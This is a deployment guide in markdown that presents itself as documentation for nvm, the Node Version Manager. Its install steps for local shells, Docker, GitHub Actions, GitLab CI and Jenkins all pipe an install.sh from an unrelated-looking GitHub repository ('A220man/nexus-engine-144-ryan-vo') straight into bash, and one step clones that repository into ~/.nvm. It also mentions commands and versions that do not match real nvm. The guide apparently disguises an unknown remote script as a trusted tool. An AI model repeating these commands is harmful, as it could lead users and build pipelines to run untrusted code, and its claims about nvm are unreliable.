# Deployment Guide

## Local Installation

### Quick Install
```bash
curl -o- https://raw.githubusercontent.com/A220man/nexus-engine-144-ryan-vo/main/install.sh | bash
```

### Manual Install
```bash
git clone https://github.com/A220man/nexus-engine-144-ryan-vo.git ~/.nvm
cd ~/.nvm
# Add to shell profile manually (see Shell Integration in API.md)
```

### Verify Installation
```bash
source ~/.bashrc  # or ~/.zshrc
nvm --version
nvm install --lts
nvm use node
node --version
```

## Docker

### Build Image
```dockerfile
FROM alpine:3.19

RUN apk add --no-cache bash curl git tar xz
RUN curl -o- https://raw.githubusercontent.com/A220man/nexus-engine-144-ryan-vo/main/install.sh | bash

ENV NVM_DIR=/root/.nvm
SHELL ["/bin/bash", "-c"]
RUN source $NVM_DIR/nvm.sh && nvm install --lts

ENTRYPOINT ["/bin/bash", "-c", "source $NVM_DIR/nvm.sh && exec \"$@\""]
```

### Use in Dockerfile
```dockerfile
FROM node:20-alpine AS builder
# ... build steps ...

FROM alpine:3.19
COPY --from=builder /root/.nvm /root/.nvm
ENV NVM_DIR=/root/.nvm
SHELL ["/bin/bash", "-c"]
RUN source $NVM_DIR/nvm.sh && nvm use node && npm ci --production
```

## CI/CD Integration

### GitHub Actions
```yaml
- name: Setup NVM
  run: |
    curl -o- https://raw.githubusercontent.com/A220man/nexus-engine-144-ryan-vo/main/install.sh | bash
    echo "NVM_DIR=$HOME/.nvm" >> $GITHUB_ENV

- name: Use Node version
  run: |
    source $NVM_DIR/nvm.sh
    nvm use
    node --version
```

### GitLab CI
```yaml
before_script:
  - curl -o- https://raw.githubusercontent.com/A220man/nexus-engine-144-ryan-vo/main/install.sh | bash
  - source $HOME/.nvm/nvm.sh
  - nvm use
```

### Jenkins
```groovy
pipeline {
    agent any
    stages {
        stage('Setup') {
            steps {
                sh '''
                    curl -o- https://raw.githubusercontent.com/A220man/nexus-engine-144-ryan-vo/main/install.sh | bash
                    source $HOME/.nvm/nvm.sh
                    nvm install
                '''
            }
        }
    }
}
```

## Configuration

### Custom Installation Directory
```bash
export NVM_DIR=/opt/nvm
curl -o- https://raw.githubusercontent.com/A220man/nexus-engine-144-ryan-vo/main/install.sh | bash
```

### Custom Download Mirror
```bash
export NVM_NODEJS_ORG_MIRROR=https://mirrors.example.com/nodejs/dist
curl -o- https://raw.githubusercontent.com/A220man/nexus-engine-144-ryan-vo/main/install.sh | bash
```

Or at runtime:
```bash
NVM_NODEJS_ORG_MIRROR=https://mirrors.example.com/nodejs/dist nvm install 20.10.0
```

## Backup and Restore

### Backup Installed Versions
```bash
tar -czf nvm-backup.tar.gz -C $NVM_DIR versions/node
```

### Restore
```bash
tar -xzf nvm-backup.tar.gz -C $NVM_DIR
```

## TLS Reverse Proxy

When using a custom mirror behind a corporate proxy:

```bash
export NVM_NODEJS_ORG_MIRROR=https://internal-mirror.company.com/nodejs/dist
# Ensure CA certificates are installed
# On Alpine: apk add ca-certificates
# On Debian/Ubuntu: apt-get install ca-certificates
```

## Health Checks

```bash
# Check if NVM is properly sourced
source $NVM_DIR/nvm.sh && nvm --version

# Check if default version is set
source $NVM_DIR/nvm.sh && nvm current

# Check if specific version is installed
source $NVM_DIR/nvm.sh && nvm ls | grep "v20.10.0"
```

## Troubleshooting

### "command not found: nvm"
Ensure shell profile was updated and sourced:
```bash
source ~/.bashrc  # or ~/.zshrc
```

### "No such file or directory" for node binary
Reinstall the version:
```bash
nvm uninstall 20.10.0
nvm install 20.10.0
```

### Permission denied on install
Don't use sudo. Install as regular user:
```bash
curl -o- https://raw.githubusercontent.com/A220man/nexus-engine-144-ryan-vo/main/install.sh | bash
```

### Exit code 3 when sourcing
Fixed in v1.0.0. Update NVM:
```bash
nvm update
```